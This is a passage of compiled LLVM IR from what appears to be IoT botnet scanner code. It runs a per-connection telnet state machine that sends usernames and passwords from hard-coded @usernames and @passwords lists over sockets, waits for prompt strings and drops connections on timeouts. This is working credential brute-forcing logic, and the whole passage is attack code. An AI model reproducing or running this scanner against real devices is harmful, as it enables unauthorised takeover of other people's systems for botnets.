  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %296, i32 0, i32 2
  store i8 0, i8* %297, align 8
  %298 = load i32, i32* %2, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 3
  store i8 1, i8* %301, align 1
  br label %333

302:                                              ; preds = %277
  %303 = load i32, i32* %2, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = load i32, i32* %2, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = call i32 (i32, i32, ...) @fcntl(i32 %312, i32 3, i8* null)
  %314 = and i32 %313, -2049
  %315 = call i32 (i32, i32, ...) @fcntl(i32 %307, i32 4, i32 %314)
  %316 = load i32, i32* %2, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 6
  store i32 0, i32* %319, align 4
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 7
  store i16 0, i16* %323, align 16
  %324 = load i32, i32* %2, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 8
  %328 = load i8*, i8** %327, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %328, i8 0, i64 1024, i1 false)
  %329 = load i32, i32* %2, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 2
  store i8 2, i8* %332, align 8
  br label %1285

333:                                              ; preds = %287
  br label %353

334:                                              ; preds = %246
  %335 = load i32, i32* %3, align 4
  %336 = icmp eq i32 %335, -1
  br i1 %336, label %337, label %352

337:                                              ; preds = %334
  %338 = load i32, i32* %2, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %339
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 16
  %343 = call i32 @sclose(i32 %342)
  %344 = load i32, i32* %2, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %345
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %346, i32 0, i32 2
  store i8 0, i8* %347, align 8
  %348 = load i32, i32* %2, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %349
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %350, i32 0, i32 3
  store i8 1, i8* %351, align 1
  br label %352

352:                                              ; preds = %337, %334
  br label %353

353:                                              ; preds = %352, %333
  %354 = load i32, i32* %2, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %355
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %356, i32 0, i32 6
  %358 = load i32, i32* %357, align 4
  %359 = add i32 %358, 10
  %360 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %361 = icmp ult i32 %359, %360
  br i1 %361, label %362, label %377

362:                                              ; preds = %353
  %363 = load i32, i32* %2, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %364
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %365, i32 0, i32 0
  %367 = load i32, i32* %366, align 16
  %368 = call i32 @sclose(i32 %367)
  %369 = load i32, i32* %2, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 2
  store i8 0, i8* %372, align 8
  %373 = load i32, i32* %2, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 3
  store i8 1, i8* %376, align 1
  br label %377

377:                                              ; preds = %362, %353
  br label %1284

378:                                              ; preds = %66
  %379 = load i32, i32* %2, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 6
  %383 = load i32, i32* %382, align 4
  %384 = icmp eq i32 %383, 0
  br i1 %384, label %385, label %391

385:                                              ; preds = %378
  %386 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %387 = load i32, i32* %2, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %388
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %389, i32 0, i32 6
  store i32 %386, i32* %390, align 4
  br label %391

391:                                              ; preds = %385, %378
  %392 = load i32, i32* %2, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 0
  %396 = load i32, i32* %395, align 16
  %397 = load i32, i32* %2, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %398
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %399, i32 0, i32 8
  %401 = load i8*, i8** %400, align 8
  %402 = load i32, i32* %2, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %403
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %404, i32 0, i32 7
  %406 = load i16, i16* %405, align 16
  %407 = zext i16 %406 to i32
  %408 = call i32 @readUntil(i32 %396, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %401, i32 1024, i32 %407)
  %409 = icmp ne i32 %408, 0
  br i1 %409, label %410, label %428

410:                                              ; preds = %391
  %411 = load i32, i32* %2, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 6
  store i32 0, i32* %414, align 4
  %415 = load i32, i32* %2, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %416
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %417, i32 0, i32 7
  store i16 0, i16* %418, align 16
  %419 = load i32, i32* %2, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 8
  %423 = load i8*, i8** %422, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %423, i8 0, i64 1024, i1 false)
  %424 = load i32, i32* %2, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 2
  store i8 3, i8* %427, align 8
  br label %1285

428:                                              ; preds = %391
  %429 = load i32, i32* %2, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 8
  %433 = load i8*, i8** %432, align 8
  %434 = call i64 @strlen(i8* %433) #11
  %435 = trunc i64 %434 to i16
  %436 = load i32, i32* %2, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 7
  store i16 %435, i16* %439, align 16
  br label %440

440:                                              ; preds = %428
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 6
  %445 = load i32, i32* %444, align 4
  %446 = add i32 %445, 30
  %447 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %448 = icmp ult i32 %446, %447
  br i1 %448, label %449, label %464

449:                                              ; preds = %440
  %450 = load i32, i32* %2, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %451
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %452, i32 0, i32 0
  %454 = load i32, i32* %453, align 16
  %455 = call i32 @sclose(i32 %454)
  %456 = load i32, i32* %2, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 2
  store i8 0, i8* %459, align 8
  %460 = load i32, i32* %2, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %461
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %462, i32 0, i32 3
  store i8 1, i8* %463, align 1
  br label %464

464:                                              ; preds = %449, %440
  br label %1284

465:                                              ; preds = %66
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 0
  %470 = load i32, i32* %469, align 16
  %471 = load i32, i32* %2, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 4
  %475 = load i8, i8* %474, align 2
  %476 = zext i8 %475 to i64
  %477 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %476
  %478 = load i8*, i8** %477, align 8
  %479 = load i32, i32* %2, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %480
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %481, i32 0, i32 4
  %483 = load i8, i8* %482, align 2
  %484 = zext i8 %483 to i64
  %485 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %484
  %486 = load i8*, i8** %485, align 8
  %487 = call i64 @strlen(i8* %486) #11
  %488 = call i64 @send(i32 %470, i8* %478, i64 %487, i32 16384)
  %489 = icmp slt i64 %488, 0
  br i1 %489, label %490, label %505

490:                                              ; preds = %465
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 0
  %495 = load i32, i32* %494, align 16
  %496 = call i32 @sclose(i32 %495)
  %497 = load i32, i32* %2, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 2
  store i8 0, i8* %500, align 8
  %501 = load i32, i32* %2, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 3
  store i8 1, i8* %504, align 1
  br label %1285

505:                                              ; preds = %465
  %506 = load i32, i32* %2, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 0
  %510 = load i32, i32* %509, align 16
  %511 = call i64 @send(i32 %510, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i64 0, i64 0), i64 2, i32 16384)
  %512 = icmp slt i64 %511, 0
  br i1 %512, label %513, label %528

513:                                              ; preds = %505
  %514 = load i32, i32* %2, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 0
  %518 = load i32, i32* %517, align 16
  %519 = call i32 @sclose(i32 %518)
  %520 = load i32, i32* %2, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 2
  store i8 0, i8* %523, align 8
  %524 = load i32, i32* %2, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 3
  store i8 1, i8* %527, align 1
  br label %1285

528:                                              ; preds = %505
  %529 = load i32, i32* %2, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %530
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 2
  store i8 4, i8* %532, align 8
  br label %1284

533:                                              ; preds = %66
  %534 = load i32, i32* %2, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %535
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %536, i32 0, i32 6
  %538 = load i32, i32* %537, align 4
  %539 = icmp eq i32 %538, 0
  br i1 %539, label %540, label %546

540:                                              ; preds = %533
  %541 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %542 = load i32, i32* %2, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 6
  store i32 %541, i32* %545, align 4
  br label %546

546:                                              ; preds = %540, %533
  %547 = load i32, i32* %2, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 0
  %551 = load i32, i32* %550, align 16
  %552 = load i32, i32* %2, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 8
  %556 = load i8*, i8** %555, align 8
  %557 = load i32, i32* %2, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %558
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %559, i32 0, i32 7
  %561 = load i16, i16* %560, align 16
  %562 = zext i16 %561 to i32
  %563 = call i32 @readUntil(i32 %551, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %556, i32 1024, i32 %562)
  %564 = icmp ne i32 %563, 0
  br i1 %564, label %565, label %597

565:                                              ; preds = %546
  %566 = load i32, i32* %2, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 6
  store i32 0, i32* %569, align 4
  %570 = load i32, i32* %2, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 7
  store i16 0, i16* %573, align 16
  %574 = load i32, i32* %2, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 8
  %578 = load i8*, i8** %577, align 8
  %579 = call i8* @strstr(i8* %578, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i64 0, i64 0)) #11
  %580 = icmp ne i8* %579, null
  br i1 %580, label %581, label %586

581:                                              ; preds = %565
  %582 = load i32, i32* %2, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 2
  store i8 5, i8* %585, align 8
  br label %591

586:                                              ; preds = %565
  %587 = load i32, i32* %2, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 2
  store i8 100, i8* %590, align 8
  br label %591

591:                                              ; preds = %586, %581
  %592 = load i32, i32* %2, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %593
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %594, i32 0, i32 8
  %596 = load i8*, i8** %595, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %596, i8 0, i64 1024, i1 false)
  br label %1285

597:                                              ; preds = %546
  %598 = load i32, i32* %2, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 8
  %602 = load i8*, i8** %601, align 8
  %603 = call i8* @strstr(i8* %602, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i64 0, i64 0)) #11
  %604 = icmp ne i8* %603, null
  br i1 %604, label %605, label %620

605:                                              ; preds = %597
  %606 = load i32, i32* %2, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 0
  %610 = load i32, i32* %609, align 16
  %611 = call i32 @sclose(i32 %610)
  %612 = load i32, i32* %2, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 2
  store i8 0, i8* %615, align 8
  %616 = load i32, i32* %2, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %617
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %618, i32 0, i32 3
  store i8 0, i8* %619, align 1
  br label %1285

620:                                              ; preds = %597
  %621 = load i32, i32* %2, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %622
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %623, i32 0, i32 8
  %625 = load i8*, i8** %624, align 8
  %626 = call i64 @strlen(i8* %625) #11
  %627 = trunc i64 %626 to i16
  %628 = load i32, i32* %2, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 7
  store i16 %627, i16* %631, align 16
  br label %632

632:                                              ; preds = %620
  %633 = load i32, i32* %2, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 6
  %637 = load i32, i32* %636, align 4
  %638 = add i32 %637, 30
  %639 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %640 = icmp ult i32 %638, %639
  br i1 %640, label %641, label %656

641:                                              ; preds = %632
  %642 = load i32, i32* %2, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 0
  %646 = load i32, i32* %645, align 16
  %647 = call i32 @sclose(i32 %646)
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 2
  store i8 0, i8* %651, align 8
  %652 = load i32, i32* %2, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 3
  store i8 1, i8* %655, align 1
  br label %656

656:                                              ; preds = %641, %632
  br label %1284

657:                                              ; preds = %66
  %658 = load i32, i32* %2, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 0
  %662 = load i32, i32* %661, align 16
  %663 = load i32, i32* %2, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 5
  %667 = load i8, i8* %666, align 1
  %668 = zext i8 %667 to i64
  %669 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %668
  %670 = load i8*, i8** %669, align 8
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 5
  %675 = load i8, i8* %674, align 1
  %676 = zext i8 %675 to i64
  %677 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %676
  %678 = load i8*, i8** %677, align 8
  %679 = call i64 @strlen(i8* %678) #11
  %680 = call i64 @send(i32 %662, i8* %670, i64 %679, i32 16384)
  %681 = icmp slt i64 %680, 0
  br i1 %681, label %682, label %697

682:                                              ; preds = %657
  %683 = load i32, i32* %2, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 0
  %687 = load i32, i32* %686, align 16
  %688 = call i32 @sclose(i32 %687)
  %689 = load i32, i32* %2, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 2
  store i8 0, i8* %692, align 8
  %693 = load i32, i32* %2, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 3
  store i8 1, i8* %696, align 1
  br label %1285

697:                                              ; preds = %657
  %698 = load i32, i32* %2, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 0
  %702 = load i32, i32* %701, align 16
  %703 = call i64 @send(i32 %702, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i64 0, i64 0), i64 2, i32 16384)
  %704 = icmp slt i64 %703, 0
  br i1 %704, label %705, label %720

705:                                              ; preds = %697
  %706 = load i32, i32* %2, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 0
  %710 = load i32, i32* %709, align 16
  %711 = call i32 @sclose(i32 %710)
  %712 = load i32, i32* %2, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 2
  store i8 0, i8* %715, align 8
  %716 = load i32, i32* %2, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %717
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %718, i32 0, i32 3
  store i8 1, i8* %719, align 1
  br label %1285

720:                                              ; preds = %697
  %721 = load i32, i32* %2, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %722
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %723, i32 0, i32 2
  store i8 6, i8* %724, align 8
  br label %1284

725:                                              ; preds = %66
  %726 = load i32, i32* %2, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 6
  %730 = load i32, i32* %729, align 4
  %731 = icmp eq i32 %730, 0
  br i1 %731, label %732, label %738

732:                                              ; preds = %725
  %733 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %734 = load i32, i32* %2, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 6
  store i32 %733, i32* %737, align 4
  br label %738

738:                                              ; preds = %732, %725
  %739 = load i32, i32* %2, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 0
  %743 = load i32, i32* %742, align 16
  %744 = load i32, i32* %2, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %745
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %746, i32 0, i32 8
  %748 = load i8*, i8** %747, align 8
  %749 = load i32, i32* %2, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %750
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %751, i32 0, i32 7
  %753 = load i16, i16* %752, align 16
  %754 = zext i16 %753 to i32
  %755 = call i32 @readUntil(i32 %743, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %748, i32 1024, i32 %754)
  %756 = icmp ne i32 %755, 0
  br i1 %756, label %757, label %832

757:                                              ; preds = %738
  %758 = load i32, i32* %2, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %759
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %760, i32 0, i32 6
  store i32 0, i32* %761, align 4
  %762 = load i32, i32* %2, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %763
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %764, i32 0, i32 7
  store i16 0, i16* %765, align 16
  %766 = load i32, i32* %2, align 4
  %767 = sext i32 %766 to i64
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %767
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %768, i32 0, i32 8
  %770 = load i8*, i8** %769, align 8
  %771 = call i8* @strstr(i8* %770, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i64 0, i64 0)) #11
  %772 = icmp ne i8* %771, null
